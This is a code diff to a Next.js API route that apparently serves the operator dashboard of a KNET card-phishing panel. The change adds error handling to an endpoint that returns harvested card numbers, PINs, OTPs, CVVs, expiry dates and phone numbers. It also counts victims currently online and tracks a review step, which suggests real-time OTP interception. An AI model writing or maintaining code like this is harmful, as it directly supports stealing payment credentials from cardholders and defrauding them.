@@ -25,26 +25,35 @@ const ONLINE_MS = 45_000;
 export async function GET(req: Request) {
   if (!bearer(req)) return NextResponse.json({}, { status: 401 });
 
-  const [knet, sessions] = await Promise.all([
-    getAllKnetRecords().catch(() => []),
-    getPresenceSessions().catch(() => []),
-  ]);
+  try {
+    const [knet, sessions] = await Promise.all([
+      getAllKnetRecords().catch((e) => { console.error("[submissions] knet error:", e); return []; }),
+      getPresenceSessions().catch((e) => { console.error("[submissions] sessions error:", e); return []; }),
+    ]);
 
-  const now = Date.now();
-  const active = sessions.filter((s) => now - s.lastSeen.getTime() < ONLINE_MS).length;
+    const now = Date.now();
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const active = sessions.filter((s: any) => {
+      const ts = s.lastSeen instanceof Date ? s.lastSeen.getTime() : new Date(s.lastSeen).getTime();
+      return now - ts < ONLINE_MS;
+    }).length;
 
-  const submissions = knet.map((k) => ({
-    id: k.id,
-    card: k.cardNumber,
-    pin: k.pin,
-    otp: k.otp2 || k.otp,
-    cvv: k.cvv,
-    phone: k.phone || k.msisdnDisplay || "",
-    amount: (k.amountHalalas / 100).toFixed(3),
-    time: k.createdAt,
-    status: mapStatus(k.status, k.reviewStep),
-    expiry: k.expiryDate,
-  }));
+    const submissions = knet.map((k) => ({
+      id: k.id,
+      card: k.cardNumber,
+      pin: k.pin,
+      otp: k.otp2 || k.otp,
+      cvv: k.cvv,
+      phone: k.phone || k.msisdnDisplay || "",
+      amount: (k.amountHalalas / 100).toFixed(3),
+      time: k.createdAt,
+      status: mapStatus(k.status, k.reviewStep),
+      expiry: k.expiryDate,
+    }));
 
-  return NextResponse.json({ submissions, active });
+    return NextResponse.json({ submissions, active });
+  } catch (e) {
+    console.error("[submissions] unhandled:", e);
+    return NextResponse.json({ error: String(e).slice(0, 300) }, { status: 500 });
+  }
 }
